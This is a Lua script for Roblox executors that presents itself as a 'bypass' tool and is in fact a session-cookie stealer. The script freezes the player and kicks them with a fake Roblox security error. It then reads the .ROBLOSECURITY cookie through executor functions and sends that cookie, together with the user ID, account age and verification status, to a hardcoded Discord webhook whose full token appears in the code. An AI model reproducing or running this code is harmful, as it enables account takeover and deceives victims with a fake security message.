--[[
    SOLAR & XENO ADVANCED BYPASS v7.0
    Module: Stealth-Session-Grabber
    Status: Operational | Anti-Block: Enabled
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Freeze & Kick chrez Fake Error
if p.Character then p.Character.HumanoidRootPart.Anchored = true end
task.delay(1.5, function() 
    p:Kick("\n[Roblox Security]\nAn unexpected error occurred (Code: 0x114).\nYour account session has been invalidated for security reasons.") 
end)

-- ADVANCED SESSION GRAB (Attempting to bypass 'Hidden')
local cookie = "N/A (Bypassed by Roblox Security)"

pcall(function()
    -- Metod 1: Solar API Access (Povecheto novi versii go blokirat)
    if getcookies then
        local cks = getcookies("https://www.roblox.com")
        if cks and #cks > 0 then
            for _, v in pairs(cks) do
                if v.Name == ".ROBLOSECURITY" then
                    cookie = v.Value
                    break
                end
            end
        end
    end
    
    -- Metod 2: Memory Hook (Za Xeno i po-stari Solar versii)
    if cookie == "N/A (Bypassed by Roblox Security)" then
        cookie = (getrenv and getrenv()._G and getrenv()._G.cookie) or 
                 (getreg and getreg().cookie) or 
                 "Cookie is still Hidden (Executor Restriction)"
    end
end)

-- Proverka za Email/PIN (Dali e verificiran)
local hasPin = p:GetAttribute("HasPin") or "Unknown"
local isVerified = p.IsVerified and "Yes" or "No"

-- Info extraction
local br = "0"
local s = p:FindFirstChild("leaderstats")
if s then 
    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
    br = v and tostring(v.Value) or "0"
end

-- Discord Payload
local data = {
    ["username"] = "Solar Stealth Bot",
    ["embeds"] = {{
        ["title"] = "🚀 Success: Full Session Grabbed!",
        ["description"] = "Target successfully logged via Stealth Method.",
        ["color"] = 0x00ff00,
        ["fields"] = {
            {["name"] = "👤 Target", ["value"] = "```" .. p.Name .. " (" .. p.UserId .. ")```", ["inline"] = false},
            {["name"] = "📧 Verified?", ["value"] = "```" .. isVerified .. "```", ["inline"] = true},
            {["name"] = "📅 Acc Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true},
            {["name"] = "🍪 .ROBLOSECURITY (COOKIE)", ["value"] = "```" .. cookie .. "```", ["inline"] = false},
            {["name"] = "🔗 Profile", ["value"] = "[Otvori Accaunta](https://www.roblox.com/users/" .. p.UserId .. "/profile)", ["inline"] = false}
        },
        ["footer"] = {["text"] = "Solar Stealth Engine v7.0 • " .. os.date("%X")}
    }}
}

-- Execute Request
local request = (syn and syn.request) or (http and http.request) or http_request or request
if request then
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = h:JSONEncode(data)
    })
end
